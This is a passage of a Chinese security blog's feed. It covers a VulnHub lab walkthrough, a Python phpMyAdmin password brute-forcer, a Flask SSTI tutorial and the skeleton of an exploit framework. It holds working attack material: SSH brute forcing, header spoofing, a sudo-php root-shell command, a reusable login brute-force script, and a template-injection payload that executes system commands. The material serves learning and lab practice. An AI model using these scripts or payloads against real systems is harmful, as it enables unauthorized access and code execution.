alt=""></p><p>所以这个判断也是为永真状态</p><p>也就是说无论什么用户，<code>$dev0ption[&#39;isAdmin&#39;]</code>一定是为true的</p><p>并且<code>user_permission</code>设置为true，并带入到其他变量中</p><p>不再往下分析，简单的说就是判断逻辑不严谨并且用户名参数可控导致了漏洞存在！</p><hr><h1 id="该文章仅为自己的看法，如有错误，请告知"><a href="#该文章仅为自己的看法，如有错误，请告知" class="headerlink" title="该文章仅为自己的看法，如有错误，请告知"></a>该文章仅为自己的看法，如有错误，请告知</h1>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VulnHub:Me-and-My-Girlfriend-1</title>
    <link href="/2020/04/10/Web/%E9%9D%B6%E5%9C%BA/Me-and-My-Girlfriend-1/"/>
    <url>/2020/04/10/Web/%E9%9D%B6%E5%9C%BA/Me-and-My-Girlfriend-1/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>第一次玩vulnhub,先根据了自己的思路来<br>但是提权那我不会,按部就班的学习：<a href="https://www.freebuf.com/articles/others-articles/227157.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/227157.html</a></p><p>题目下载地址：<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/" target="_blank" rel="noopener">me-and-my-girlfriend-1</a></p><p><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/0.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><ul><li><code>nmap扫描主机</code><pre><code>nmap -A 192.168.177.129</code></pre><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/1.png" srcset="/img/loading.gif" alt=""><br>发现只开放了22和88端口</li></ul><ul><li><code>尝试SSH爆破</code>：使用MSF自带的模块<pre><code>use auxiliary/scanner/ssh/ssh_loginset RHOSTS 192.168.177.129set USERNAME rootset PASS_FILE /root/桌面/TOP.txt</code></pre><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/2.png" srcset="/img/loading.gif" alt=""><br>进行SSH弱口令爆破，尝试无果</li></ul><ul><li><p><code>访问web界面查看</code><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/3.png" srcset="/img/loading.gif" alt=""><br>可看到只允许本地，而且源码也提示了<code>X-Forwarded-For</code></p></li><li><p><code>X-Forwarded-For</code>进行IP伪造</p><pre><code>X-Forwarded-For: 127.0.0.1</code></pre><p><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/4.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/5.png" srcset="/img/loading.gif" alt=""><br>成功访问到正确页面，对页面进行查看了一下，About和Home没有什么有价值的信息<br>注册账号进行登录</p></li><li><p><code>登录账号并进行查看</code><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/6.png" srcset="/img/loading.gif" alt=""><br>登录后在Profile页面，可看到有登录的账号，并且密码可直接在源码中查看<br>可看到URL有个<code>user_id</code>参数，第一反应是进行SQL。。。但想到这是后台就放弃了<br>尝试修改ID值，发现可进行越权查看<br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/7.png" srcset="/img/loading.gif" alt=""></p></li><li><p><code>Burp遍历ID值</code><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/8.png" srcset="/img/loading.gif" alt=""><br>寻找Alice的账号，题目最开始就是让获取Alice主机的权限<br>既然是主机权限，又有账号密码，还有个22端口<br>尝试登陆SSH</p></li><li><p><code>登陆SSH</code><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/9.png" srcset="/img/loading.gif" alt=""></p></li><li><p><code>查找flag文件</code><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/10.png" srcset="/img/loading.gif" alt=""><br>成功获取第一个flag，但是题目说的是2个<br>该处提示我们还有个flag在<code>/root</code>目录</p></li><li><p><code>尝试访问/root 目录</code><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/11.png" srcset="/img/loading.gif" alt=""><br>提示我们没有访问权限，查看权限<br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/12.png" srcset="/img/loading.gif" alt=""><br>看来需要进行提权，But提权不会，上网找文章学习，链接在开头处</p></li></ul><ul><li><p><code>提权相关信息收集</code></p><pre><code>查看内核：uname -a列举用户权限：sudo -l</code></pre><p><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/13.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/14.png" srcset="/img/loading.gif" alt=""><br>可看到有个以Root权限运行的：<code>/usr/bin/php</code>程序</p></li><li><p><code>利用php脚本程序提权</code>：返回一个bash</p><pre><code>sudo php -r &#39;system(&quot;/bin/bash&quot;);&#39;</code></pre><p><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/15.png" srcset="/img/loading.gif" alt=""></p></li><li><p><code>访问/root 获取flag2</code><br><img src="/images/Web/Vulnhub/me_and_my_girlfriend_1/16.png" srcset="/img/loading.gif" alt=""></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin爆破</title>
    <link href="/2020/02/25/Python/phpmyadmin%E7%88%86%E7%A0%B4/"/>
    <url>/2020/02/25/Python/phpmyadmin%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>环境：</p><ul><li>phpstudy2016</li><li>PHP5.4.5</li></ul><p>对phpmyadmin进行抓包分析</p><p><img src="/images/Python/phpmyadmin/1.png" srcset="/img/loading.gif" alt="1"></p><p>可以看到提交的参数</p><pre><code>pma_username=root&amp;pma_password=root&amp;server=1&amp;token=a40f1e11ec5dd5b0a7d3ea945ae0adfb</code></pre><p>分别是：用户，密码，服务，token</p><p>查看下提交页面的源码以获取<code>token</code></p><p><img src="/images/Python/phpmyadmin/2.png" srcset="/img/loading.gif" alt=""></p><p><code>token</code>是可以在网页中获取到的，进行下一步提交</p><p><img src="/images/Python/phpmyadmin/3.png" srcset="/img/loading.gif" alt=""></p><p>利用了GET方式向<code>index.php</code>提交了<code>token</code>，继续</p><p><img src="/images/Python/phpmyadmin/4.png" srcset="/img/loading.gif" alt=""></p><p>GET方式向<code>navigation.php</code>提交了<code>token</code>，继续</p><p><img src="/images/Python/phpmyadmin/5.png" srcset="/img/loading.gif" alt=""></p><p>提交了之后，可以看到网页显示了，一个库的操作界面，到此我们就可结束了，为啥？</p><p>因为，已经成功的进入到后台，我们并不需要完整的显示，<code>只需要区别于登录界面，获取关键字即可</code></p><p><img src="/images/Python/phpmyadmin/6.png" srcset="/img/loading.gif" alt=""></p><p>总结：</p><ul><li><p>POST请求提交了：<code>用户</code>，<code>密码</code>，<code>token</code></p><blockquote><p>该请求，完之后会有一个302的重定向</p></blockquote></li><li><p>GET请求向<code>index.php</code>提交了token</p></li><li><p>GET请求向<code>navigation.php</code>提交了token</p></li><li><p>直接进入后台</p></li></ul><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>思路：</p><ol><li>向登录界面获取token</li><li>POST提交账号密码和token（需要开启session）</li><li>GET提交token</li></ol><p>写个函数获取网页的token，用re模块获取字符串</p><pre><code class="python">import requests,refrom colorama import Fore# 获取tokendef Get_Token(url):    req = requests.get(url)    if req.status_code == 200:        token = re.search(&quot;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot;&quot;,req.text).group(1)        return token    else:        print(Fore.RED + &quot;[-]&quot; + Fore.WHITE + &quot; 访问网站失败,响应码为: {0}&quot;.format(req.status_code))        exit(0)</code></pre><p>提交用户密码和<code>token</code>，并且接着GET</p><blockquote><p>Ps：由于有302跳转，所以我们使用session进行维持</p></blockquote><pre><code class="python">import requests,refrom colorama import Fore# 获取tokendef Get_Token(url):    req = requests.get(url)    if req.status_code == 200:        token = re.search(&quot;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot;&quot;,req.text).group(1)        return token    else:        print(Fore.RED + &quot;[-]&quot; + Fore.WHITE + &quot; 访问网站失败,响应码为: {0}&quot;.format(req.status_code))        exit(0)def Crack(url):    header = {&quot;User-Agent&quot;: &quot;Mozilla / 5.0(Windows NT 10.0;WOW64;rv: 52.0) Gecko / 20100101Firefox / 52.0&quot;}    session = requests.session()    token = Get_Token(url)    data = {        &quot;pma_username&quot;: &quot;root&quot;,  # 用户        &quot;pma_password&quot;: &quot;root&quot;,  # 密码        &quot;server&quot;: &quot;1&quot;,        &quot;lang&quot;: &quot;zh_CN&quot;,        &quot;token&quot;: token  # token    }    r = session.post(url,data=data,headers=header)    phpmyadmin = session.get(url + &#39;navigation.php?token=&#39; + token,headers=header)    # print(phpmyadmin.text)    if &quot;主页&quot; in phpmyadmin.text:        print(Fore.GREEN + &quot;[+] &quot; + &quot;{0} {1}&quot;.format(&quot;root&quot;, &quot;root&quot;))        exit(0)if __name__ == &quot;__main__&quot;:    # &quot;http://127.0.0.1/phpmyadmin/&quot;    Crack(&quot;http://127.0.0.1/phpmyadmin/&quot;)</code></pre><p><img src="/images/Python/phpmyadmin/7.png" srcset="/img/loading.gif" alt="image-20200226131710891"></p><p>可以看到能直接登录到页面内了，接下来就修改下代码，就可以了进行爆破了</p><pre><code class="python">import requests,refrom colorama import Fore# 获取tokendef Get_Token(url):    req = requests.get(url)    if req.status_code == 200:        token = re.search(&quot;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot;&quot;,req.text).group(1)        return token    else:        print(Fore.RED + &quot;[-]&quot; + Fore.WHITE + &quot; 访问网站失败,响应码为: {0}&quot;.format(req.status_code))        exit(0)def Crack(url,users):    header = {&quot;User-Agent&quot;: &quot;Mozilla / 5.0(Windows NT 10.0;WOW64;rv: 52.0) Gecko / 20100101Firefox / 52.0&quot;}    session = requests.session()    token = Get_Token(url)    for user in users:        for pwd in users:            data = {                &quot;pma_username&quot;: user,  # 用户                &quot;pma_password&quot;: pwd,  # 密码                &quot;server&quot;: &quot;1&quot;,                &quot;lang&quot;: &quot;zh_CN&quot;,                &quot;token&quot;: token  # token            }            print(Fore.RED + &quot;[*] &quot; + Fore.WHITE + &quot;正在进行破解：{0}   |   {1}&quot;.format(user, pwd))            r = session.post(url,data=data,headers=header)            phpmyadmin = session.get(url + &#39;navigation.php?token=&#39; + token,headers=header)            # print(phpmyadmin.text)            if &quot;主页&quot; in phpmyadmin.text:                print(Fore.GREEN + &quot;[+] &quot; + &quot;{0} {1}&quot;.format(user, pwd))                exit(0)    print(Fore.RED + &quot;[-] &quot; + Fore.WHITE + &quot;爆破失败，请换个字典&quot;)if __name__ == &quot;__main__&quot;:    filename = input(Fore.RED + &quot;Filename &gt; &quot; + Fore.GREEN)    Url = input(Fore.RED + &quot;Url &gt; &quot; + Fore.GREEN)    user = []    for username in open(filename,&quot;r&quot;):        user.append(username.strip(&quot;\n&quot;))    print(Fore.GREEN + &quot;[+] 开始暴力破解phpmyadmin&quot; + Fore.WHITE)    # &quot;http://127.0.0.1/phpmyadmin/&quot;    Crack(Url+&quot;/&quot;,user)</code></pre><p><img src="/images/Python/phpmyadmin/8.png" srcset="/img/loading.gif" alt="image-20200226131710891"></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask-SSTI (模板注入漏洞)</title>
    <link href="/2020/01/29/%E6%BC%8F%E6%B4%9E/Flask-ssti/"/>
    <url>/2020/01/29/%E6%BC%8F%E6%B4%9E/Flask-ssti/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>SSTI</code>（Server-Side Template Injection）：服务端模板注入，服务器模板中拼接了恶意用户输入导致各种漏洞<br>通过模板，web应用可以把输入转换成特定的HTML文件或email格式</p><p><code>Jinja2</code>：Flask作者开发的模板系统，存在三种分隔符语法从HTML转义</p><ul><li><code>{ % ... % }</code>：控制结构</li><li><code>{ { ... } }</code>：变量取值，表达式打印到模板输出（是一种特殊的占位符）</li><li><code>{ # ... # }</code>：注释</li></ul><hr><h1 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h1><p>漏洞代码：</p><pre><code class="python">from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    name = request.args.get(&#39;name&#39;, &#39;guest&#39;) # 获取参数    t = Template(&quot;Hello &quot; + name) # name可控    return t.render()if __name__ == &quot;__main__&quot;:    app.run()</code></pre><ul><li><p>正常访问<br><img src="/images/%E6%BC%8F%E6%B4%9E/Flask-ssti/0e5096e4-b5f9-495f-b8f0-55c4a11412cb.png" srcset="/img/loading.gif" alt="0e5096e4-b5f9-495f-b8f0-55c4a11412cb.png"></p></li><li><p>payload测试<br><img src="/images/%E6%BC%8F%E6%B4%9E/Flask-ssti/b936b0eb-e459-49c1-9b8f-0ecaff24e974.png" srcset="/img/loading.gif" alt="b936b0eb-e459-49c1-9b8f-0ecaff24e974.png"></p></li></ul><blockquote><p>Ps：该情况为开发编码不当直接使用了变量进行拼接</p></blockquote><p>修正则不存在模板注入：</p><pre><code class="python">from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    name = request.args.get(&#39;name&#39;, &#39;guest&#39;) # 获取参数    t = Template(&quot;Hello &quot; + {{n}})    return t.render(n=name)if __name__ == &quot;__main__&quot;:    app.run()</code></pre><h2 id="执行代码"><a href="#执行代码" class="headerlink" title="执行代码"></a>执行代码</h2><p><code>官方：需要在模板环境中注册函数才能在模板中进行调用</code></p><p>如：python要执行系统命令需要os模块，想要在模板中直接调用内置模块os，即需要在模板中对其注册</p><p>在Jinja2中模板能够访问python内置变量并且可以调用对应变量类型，可以用<code>Python沙盒逃逸方法</code></p><p><strong><code>Python特性</code></strong>：</p><ul><li><code>__base__</code>：以元组返回一个基类</li><li><code>__mro__</code>：以元组返回继承关系链（继承树）</li><li><code>__class__</code>：返回调用的参数类型</li><li><code>__globals__</code>：以字典返回函数所在模块命名空间中的所有变量</li><li><code>__subclasses__()</code>：以列表返回类的子类</li><li><code>__builtins__</code>：内建函数，可直接运行一些函数<blockquote><p>这些函数可在<code>__builtins__</code>中查看，<code>dir(__builtins__)</code></p></blockquote></li></ul><p>思路：从内置变量调用<code>__class__.__base__</code><br>例子：进行随意的拼接</p><pre><code>().__class__.__bases__[0].__subclasses__()[50]&#39;&#39;.__class__.__mro__[2]{}.__class__.__bases__[0][].__class__.__bases__[0]</code></pre><p>查找引用的模块</p><pre><code># 返回子类的列表&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()#从中随便选一个类,查看它的__init__&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[30].__init__&lt;slot wrapper &#39;__init__&#39; of &#39;object&#39; objects&gt;# wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性#再换几个子类，很快就能找到一个重载过__init__的类，比如&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[103].__init__&lt;function IncrementalEncoder.__init__ at 0x000002B04AE0D840&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]#然后用eval执行命令即可</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E/Flask-ssti/7c67a604-d266-45aa-a99d-43dd07574d11.png" srcset="/img/loading.gif" alt="7c67a604-d266-45aa-a99d-43dd07574d11.png"></p><p>直接写一个python脚本查更快</p><pre><code class="python">for i in range(0,115):    print(&#39;&#39;.__class__.__base__.__subclasses__()[i].__init__)    print(i)</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E/Flask-ssti/d6b0d8a2-54b9-4771-8597-1b9297adcbd6.png" srcset="/img/loading.gif" alt="d6b0d8a2-54b9-4771-8597-1b9297adcbd6.png"></p><p>测试：whoami<br>payload：<code>{ {&#39;&#39;.__class__.__base__.__subclasses__()[103].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)} }</code><br><img src="/images/%E6%BC%8F%E6%B4%9E/Flask-ssti/787b7b7c-8726-4ef5-962c-02bd386ab32e.png" srcset="/img/loading.gif" alt="787b7b7c-8726-4ef5-962c-02bd386ab32e.png"></p><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/leixiao-/p/10227867.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10227867.html</a><br><a href="https://www.cnblogs.com/hackxf/p/10480071.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>先知文章爬虫</title>
    <link href="/2019/11/24/Python/%E5%85%88%E7%9F%A5%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB/"/>
    <url>/2019/11/24/Python/%E5%85%88%E7%9F%A5%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>前几天，由于意见征集稿的出现</p><p>所以决定先把一些文章给爬下来，存着以待学习，转换成<code>markdown</code>的格式以便观看</p><p>转换md用的第三方模块：<code>html2text</code></p><hr><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>思路：</p><ul><li>用BS获取对应位置的内容</li><li>然后用<code>html2text</code>转换成md格式</li></ul><blockquote><p>Ps：先知的标题奇奇怪怪的，如果要用来做文件名，请用正则进行过滤，否则你会爬一天的。。。。</p></blockquote><pre><code class="python">import requestsimport html2text,os,codecs,refrom bs4 import BeautifulSoup# 获取网站源码def get_html(url):    result = requests.get(url)    if result.status_code == 200:        html = BeautifulSoup(result.text,&quot;lxml&quot;)        return html    else:        exit(0)# 转换markdown格式def markdown(url):    html = get_html(url)    filename = html.find(&#39;span&#39;, class_=&quot;content-title&quot;).text    day = html.find(&#39;div&#39;, class_=&#39;topic-info&#39;).select(&#39;span &gt; span&#39;)[1].text    content = html.find(&#39;div&#39;, id=&quot;topic_content&quot;)    symbols = re.compile(&quot;[^\s\w*]&quot;)    result = symbols.findall(filename)    for i in result:        if i in filename:            filename = filename.replace(i, &quot;&quot;)    if &quot;*&quot; in filename:        filename = filename.replace(&quot;*&quot;, &quot;&quot;)    markdown = html2text.HTML2Text()    markdown.ignore_links = True    print(&quot;[+] {}.md&quot;.format(filename))    file = codecs.open(&quot;./MD/&quot;+filename + &quot;.md&quot;, &quot;w+&quot;,&#39;utf-8&#39;)    file.write(&quot;`文章创作时间`: {}\n&quot;.format(day)+markdown.handle(str(content)))    file.close()# 当前页面链接def get_content(page):    url = &quot;https://xz.aliyun.com/&quot;    html = get_html(page)    links = html.find_all(&quot;a&quot;,class_=&quot;topic-title&quot;)    for i in links:        markdown(url+ i[&#39;href&#39;])# 获取页码def get_page():    url = &quot;https://xz.aliyun.com/?page=&quot;    html = get_html(url)    page_count = html.find(&#39;ul&#39;,class_=&quot;pull-right&quot;).select(&quot;ul &gt; li&quot;)[1].select(&#39;li &gt; a&#39;)[0].text.split(&quot;/&quot;)[1]    for page in range(int(page_count)):        page += 1        get_content(url+str(page))if __name__ == &quot;__main__&quot;:    if not os.path.exists(&quot;MD&quot;):        os.makedirs(&quot;MD/images&quot;)    get_page()</code></pre><blockquote><p>该爬虫仅供参考学习，需要图片下载的话，请自行添加</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python,爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简陋POC框架编写</title>
    <link href="/2019/11/17/Python/%E7%AE%80%E9%99%8Bpoc%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99/"/>
    <url>/2019/11/17/Python/%E7%AE%80%E9%99%8Bpoc%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p>网上现在有很多类似的框架，甚至架构已经十分完善的（MSF，Pocsuite3），那我为啥还要重复造造轮子呢？</p><p>写了这么多的exp，放在那里很混乱，方便管理与更新</p><p>在写框架时，遇到了很多之前不曾想过的问题，在其他的框架的分析时，学到了很多</p><p>每次的编写，都是为了以后能够制作</p><p>总结：学到了就是我的了</p><hr><h1 id="大体结构"><a href="#大体结构" class="headerlink" title="大体结构"></a>大体结构</h1><ul><li><code>lib</code>：存储核心文件</li><li><code>poc</code>：存储 poc/exp 文件</li><li><code>main.py</code>：启动脚本</li></ul><hr><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><h2 id="颜色与banner"><a href="#颜色与banner" class="headerlink" title="颜色与banner"></a>颜色与banner</h2><p>文件：<code>lib\common.py</code></p><ul><li><code>控制端颜色输出</code>：使用库<code>colorama</code></li></ul><p>至于为什么不使用其他的，因为我看着脑壳痛，拿个最简单的来使用吧</p><pre><code class="python">from colorama import Fore,Style,initdef Color(Conversion,color,Info=&#39;&#39;):    init(autoreset=True)    if color == &quot;red&quot;:        print(Fore.RED + Conversion + Fore.WHITE + Info)    elif color == &quot;green&quot;:        print(Fore.GREEN + Conversion + Fore.WHITE + Info)    elif color == &quot;yellow&quot;:        print(Fore.YELLOW + Conversion + Fore.WHITE + Info)    elif color == &quot;blue&quot;:        print(Fore.BLUE + Conversion + + Fore.WHITE + Info)    else:        print(Fore.RED + &quot;Eroor：Not color&quot;)</code></pre><p><img src="/images/Python/POC%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99/color.png" srcset="/img/loading.gif" alt=""></p><ul><li><code>banner</code>：网上有在线的文字转banner</li></ul><pre><code class="python">from colorama import Fore,Style,init# 转换颜色def Color(Conversion,color,Info=&#39;&#39;):    init(autoreset=True)    if color == &quot;red&quot;:        print(Fore.RED + Conversion + Fore.WHITE + Info)    elif color == &quot;green&quot;:        print(Fore.GREEN + Conversion + Fore.WHITE + Info)    elif color == &quot;yellow&quot;:        print(Fore.YELLOW + Conversion + Fore.WHITE + Info)    elif color == &quot;blue&quot;:        print(Fore.BLUE + Conversion + + Fore.WHITE + Info)    else:        print(Fore.RED + &quot;Eroor：Not color&quot;)# bannerdef banner():    def banner():    banner = &#39;&#39;&#39;     ______ _____ _____ _______ _    _     |  ____|  __ \_   _|__   __| |  | |     | |__  | |  | || |    | |  | |__| |    |  __| | |  | || |    | |  |  __  |    | |____| |__| || |_   | |  | |  | |    |______|_____/_____|  |_|  |_|  |_|            Author: {}    &#39;&#39;&#39;.format(&quot;只因不值得&quot;)    print(Fore.RED + banner)    print(Style.RESET_ALL)</code></pre><ul><li><code>main.py</code>文件进行调用</li></ul><pre><code class="python">from lib.common import bannerdef main():    banner()if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="/images/Python/POC%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99/banner.png" srcset="/img/loading.gif" alt=""></p><h2 id="加载模块-–-动态加载"><a href="#加载模块-–-动态加载" class="headerlink" title="加载模块 – 动态加载"></a>加载模块 – 动态加载</h2><p>两种方法：</p><ul><li><p><code>__import__()</code>：自带函数进行加载</p></li><li><p><code>importlib</code>：第三方模块进行加载</p></li></ul><p>文件：<code>Registry.py</code></p><p>在这里我选择了使用第三方模块进行加载</p><pre><code class="python">import importlib.utilimport importlib.machineryfrom lib.common import Color# 从本地导入模块def load_file_modules(file_path):    &quot;&quot;&quot;    需要加载完整的文件路径    &quot;&quot;&quot;    if &#39;&#39; not in importlib.machinery.SOURCE_SUFFIXES:        importlib.machinery.SOURCE_SUFFIXES.append(&#39;&#39;)    try:        module_file_path = file_path # file_path        # print(module_file_path) 文件路径        module_name = file_path.stem        # print(module_name) 文件名        spec = importlib.util.spec_from_file_location(module_name,module_file_path)        module = importlib.util.module_from_spec(spec)        spec.loader.exec_module(module)        # print(dir(module))        return module    except:        error_msg = &quot;Load module &#39;{0}&#39; failed! &quot;.format(file_path)        Color(error_msg,&quot;red&quot;)</code></pre><p>加载完模块之后，可以使用<code>getattr</code>调用脚本的函数之类</p><h2 id="Tab补全"><a href="#Tab补全" class="headerlink" title="Tab补全"></a>Tab补全</h2><p>其实写这个框架很久了，一直卡在这个功能这里</p><p>尤其是：<code>readline</code>模块，看的我脑壳痛，想自定义tab提示与补全，搞不定。。。肝了很久放弃ing</p><p>最后还是使用九世搞得：<code>prompt_toolkit</code>模块</p><p>在进行tab补全的时候，顺便把分隔命令一起写了吧。。。</p><p>文件：<code>lib/command.py</code></p><pre><code class="python">from prompt_toolkit import PromptSession,shortcutsfrom prompt_toolkit.completion import Completer,Completion,FuzzyCompleterclass Console_command(Completer):    def __init__(self):        self.hostname = &quot;Clover&quot; # 标识符        self.global_cmd = [&quot;help&quot;, &quot;use&quot;, &quot;exit&quot;, &quot;search&quot;, &quot;version&quot;, &quot;clear&quot;]        self.module_cmd = [&quot;run&quot;, &quot;back&quot;, &quot;set&quot;,&quot;list&quot;,&quot;show&quot;]        self.module_cmd.extend(self.global_cmd) # 全部命令        self.poc_paths = [] # 模块路径    # 分隔命令    def parse_line(self,line):        &quot;&quot;&quot;        :return: 命令,参数        &quot;&quot;&quot;        command, _, arg = line.strip().partition(&quot; &quot;)        return command, arg.strip()    # tab补全    def get_completions(self, document, complete_event,*args, **kwargs):        if &quot;use&quot; in str(document):            for poc in self.poc_paths:                yield Completion(poc,start_position=0)        else:            for command in self.module_cmd:                yield  Completion(command,start_position=0)</code></pre><p>判断当前输入的行中<code>str(document)</code>，是否有我们定义的关键字，如果有，则返回我们设定</p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><pre><code class="python">from prompt_toolkit import PromptSession,shortcutsfrom prompt_toolkit.completion import Completer,Completion,FuzzyCompleterclass Console_command(Completer):    def __init__(self):        self.hostname = &quot;Clover&quot; # 标识符        self.global_cmd = [&quot;help&quot;, &quot;use&quot;, &quot;exit&quot;, &quot;search&quot;, &quot;version&quot;, &quot;clear&quot;]        self.module_cmd = [&quot;run&quot;, &quot;back&quot;, &quot;set&quot;,&quot;list&quot;,&quot;show&quot;]        self.module_cmd.extend(self.global_cmd) # 全部命令        self.poc_paths = [] # 模块路径    # 分隔命令    def parse_line(self,line):        &quot;&quot;&quot;        :return: 命令,参数        &quot;&quot;&quot;        command, _, arg = line.strip().partition(&quot; &quot;)        return command, arg.strip()    # tab补全    def get_completions(self, document, complete_event,*args, **kwargs):        if &quot;use&quot; in str(document):            for poc in self.poc_paths:                yield Completion(poc,start_position=0)        else:            for command in self.module_cmd:                yield  Completion(command,start_position=0)    # 执行命令    def get_command_handler(self,command):        try:            get_command = getattr(self,&quot;command_{}&quot;.format(command))        except:            Color(&quot;Unknown Command: &quot;,&quot;red&quot;,&quot;{}&quot;.format(command))        return get_command</code></pre><p>通过<code>getattr</code>执行我们当前脚本的函数</p><p>如：当我们在终端输入</p><pre><code>shell &gt; use</code></pre><p>在我们后端，执行的方式就是：<code>getattr(self,command_use)</code>执行当前类中的<code>command_use</code>方法</p><p>所以，我们的大体的执行命令，定义的使用应该以，<code>command_命令</code></p><h2 id="运行框架"><a href="#运行框架" class="headerlink" title="运行框架"></a>运行框架</h2><p>文件：<code>lib\command.py</code></p><pre><code class="python">from prompt_toolkit import PromptSession,shortcutsfrom prompt_toolkit.completion import Completer,Completion,FuzzyCompleterclass Console_command(Completer):    def __init__(self):        self.hostname = &quot;Clover&quot; # 标识符        self.global_cmd = [&quot;help&quot;, &quot;use&quot;, &quot;exit&quot;, &quot;search&quot;, &quot;version&quot;, &quot;clear&quot;]        self.module_cmd = [&quot;run&quot;, &quot;back&quot;, &quot;set&quot;,&quot;list&quot;,&quot;show&quot;]        self.module_cmd.extend(self.global_cmd) # 全部命令        self.poc_paths = [] # 模块路径    # 分隔命令    def parse_line(self,line):        &quot;&quot;&quot;        :return: 命令,参数        &quot;&quot;&quot;        command, _, arg = line.strip().partition(&quot; &quot;)        return command, arg.strip()    # tab补全    def get_completions(self, document, complete_event,*args, **kwargs):        if &quot;use&quot; in str(document):            for poc in self.poc_paths:                yield Completion(poc,start_position=0)        else:            for command in self.module_cmd:                yield  Completion(command,start_position=0)    # 执行命令    def get_command_handler(self,command):        try:            get_command = getattr(self,&quot;command_{}&quot;.format(command))        except:            Color(&quot;Unknown Command: &quot;,&quot;red&quot;,&quot;{}&quot;.format(command))        return get_command    # 运行    def start(self):        session = PromptSession()        while True:            try:                command,args = self.parse_line(session.prompt(self.prompt+&quot; &gt; &quot;,completer=FuzzyCompleter(Console_command())))                command = command.lower()                if not command:                    continue                command_run = self.get_command_handler(command)                command_run(args)            except Exception as e:                pass</code></pre><ul><li>文件：<code>main.py</code></li></ul><pre><code class="python">from lib.Command import Console_commandfrom lib.common import bannerdef main():    banner()    command = Console_command()    command.start()if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="/images/Python/POC%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99/start.png" srcset="/img/loading.gif" alt=""></p><hr><h1 id="命令例子"><a href="#命令例子" class="headerlink" 